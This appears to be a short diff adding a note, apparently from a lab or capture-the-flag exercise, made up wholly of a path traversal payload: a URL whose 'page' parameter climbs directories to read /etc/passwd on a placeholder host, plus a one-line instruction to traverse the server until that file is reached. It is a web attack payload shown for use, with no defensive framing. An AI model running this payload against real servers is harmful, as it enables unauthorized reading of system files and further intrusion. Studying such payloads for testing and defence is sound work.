@@ -1,0 +1,3 @@
+http://IP/?page=../../../../../../../etc/passwd
+
+traverse server directory until you reach etc/passwd file
